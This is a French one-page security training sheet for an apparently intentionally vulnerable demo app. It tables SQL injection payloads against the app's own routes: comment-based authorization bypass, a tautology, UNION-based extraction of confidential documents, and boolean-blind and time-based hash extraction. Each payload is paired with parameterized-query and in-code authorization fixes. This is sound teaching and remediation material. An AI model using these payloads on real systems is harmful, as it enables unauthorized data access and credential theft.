# Fiche technique — Injection SQL basée sur le DOM (Atrium)

*Support de démo live / annexe de rapport — une page. Prérequis : `npm run db:reset`, connexion
`alice.martin` / `Password123` (sauf mention contraire), mode démo = **Vulnérable**.*

| # | Route / Page | Vecteur (source DOM/URL) | Payload | Requête SQL impactée (concaténée) | Effet observé | Technique | Correctif |
|---|---|---|---|---|---|---|---|
| 1 | `GET /api/profile`<br>`profile.html` | DOM — `location.hash`<br>`#id=...` | `3 -- ` (espace après `--`) | `...WHERE u.id = 3 -- AND (u.id=1 OR u.manager_id=1)` | Affiche la fiche d'un collaborateur hors périmètre (ex. Nadia, id 3) — le filtre d'autorisation est commenté | In-band, commentaire SQL (contournement d'autorisation, hiérarchie `manager_id`) | Requête paramétrée (`WHERE u.id = ?`) **+** autorisation vérifiée en code après récupération (`row.id === sessionUser.id \|\| row.manager_id === sessionUser.id`) |
| 1b | idem | idem | `0 OR 1=1 -- ` | `...WHERE u.id = 0 OR 1=1 -- AND (...)` | Affiche **toutes** les fiches de l'entreprise, mots de passe hachés inclus | In-band, tautologie + commentaire | Idem #1 |
| 2 | `GET /api/search`<br>`search.html` (champ Nom) | Paramètre d'URL/formulaire — `q=` | `zzz%' UNION SELECT id, title, 'Document confidentiel', 'N/A', NULL FROM documents WHERE confidential = 1 -- ` | `...LIKE '%zzz%' UNION SELECT id,title,'Document confidentiel','N/A',NULL FROM documents WHERE confidential=1 -- %' AND (...)` | Les 4 documents confidentiels (salaires, audit, tarifs, pentest) apparaissent déguisés en « résultats collaborateurs » | In-band, UNION-based (exfiltration inter-tables, multi-filtres) | Chaque filtre paramétré (`?`) ; périmètre réappliqué en code sur le résultat (`rows.filter(...)`) |
| 3 | `GET /api/lab/directory`<br>`directory.html` | Paramètre d'URL — `?department=` | `zzz' UNION SELECT id, title, content, 'DOCUMENT', NULL, NULL FROM documents WHERE confidential=1 -- ` | `...department = 'zzz' UNION SELECT id,title,content,'DOCUMENT',NULL,NULL FROM documents WHERE confidential=1 -- ' AND (...)` | Mêmes documents confidentiels exfiltrés via **un seul** paramètre d'URL | In-band, UNION-based (un seul champ concaténé) | Paramètre lié (`?`) ; périmètre réappliqué en code |
| 4 | `GET /api/lab/project`<br>`project.html` | DOM — `location.hash`<br>`#id=...` | `5 -- ` | `...WHERE p.id = 5 -- AND p.id IN (SELECT project_id FROM project_members WHERE user_id=1 UNION SELECT id FROM projects WHERE owner_id=1)` | Aperçu (budget, client) d'un projet dont Alice n'est pas membre (projet admin) | In-band, commentaire SQL (contournement d'autorisation, appartenance au projet) | Requête paramétrée **+** `isProjectMember()` vérifié en code après récupération |
| 5 | `GET /api/lab/login-history`<br>`admin.html` (admin uniquement) | DOM — `location.hash`<br>`#user=...` | `admin' AND 1=1 -- ` *vs* `admin' AND 1=2 -- ` | `...WHERE u.username = 'admin' AND 1=1 -- ORDER BY lh.ts DESC` | Lignes renvoyées (vrai) *vs* aucune ligne (faux) — aucune donnée d'une autre table affichée | **Aveugle** (booléen) — oracle vrai/faux | Paramètre lié (`?`) ; la chaîne reste un littéral |
| 5b | idem | idem | `admin' AND SUBSTR((SELECT password FROM users WHERE username='admin'),1,1)='$' -- ` | sous-requête booléenne sur `users.password` | Extraction caractère par caractère d'un hash, sans affichage direct | Aveugle, extraction ciblée | Idem #5 |
| — *(théorique, non câblé)* | — | — | `... OR (SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN 1 ELSE (SELECT COUNT(*) FROM users,users,users) END FROM users WHERE id=6)` | — | Délai de réponse mesurable = signal vrai/faux | **Temporel** (time-based blind) | Idem paramétrage ; voir `docs/techniques-complementaires.md` |

## Contre-mesures — synthèse ultra-courte

| Cause racine | Correctif | Pourquoi |
|---|---|---|
| Entrée concaténée → réinterprétée comme SQL | **Requêtes paramétrées** (`?` + tableau de valeurs) | Le moteur sépare texte de requête et valeurs ; une valeur ne peut plus changer la structure SQL |
| Filtre d'autorisation écrit *dans* le SQL concaténé | **Autorisation vérifiée en code**, après une lecture paramétrée | Plus aucune valeur de l'URL n'atteint la comparaison d'autorisation |
| Valeur mal formée atteint la base | **Validation de format stricte** (`/^\d+$/` pour un ID) avant toute requête | Rejette la charge en amont (défense en profondeur, pas suffisante seule) |
| Message d'erreur SQL brut renvoyé au client | **Erreur générique côté client**, détail en log serveur | Évite de divulguer le schéma (CWE-209) |

## Repères CWE

`CWE-89` injection SQL · `CWE-285` autorisation mal placée · `CWE-639` IDOR (clé contrôlée par
l'utilisateur) · `CWE-209` fuite de message d'erreur SQL.

## Repère mental : source → transit → sink → retour

```
DOM (location.hash) / URL (?param)  →  fetch() côté client  →  concaténation SQL serveur  →  JSON affiché
      SOURCE                              TRANSIT                      SINK                    RETOUR
```

*Le fragment d'URL (`#...`) n'est jamais envoyé au serveur par la navigation — seul le `fetch`
du JavaScript client le transmet. Un WAF réseau ne voit donc jamais la charge avant cette étape.*
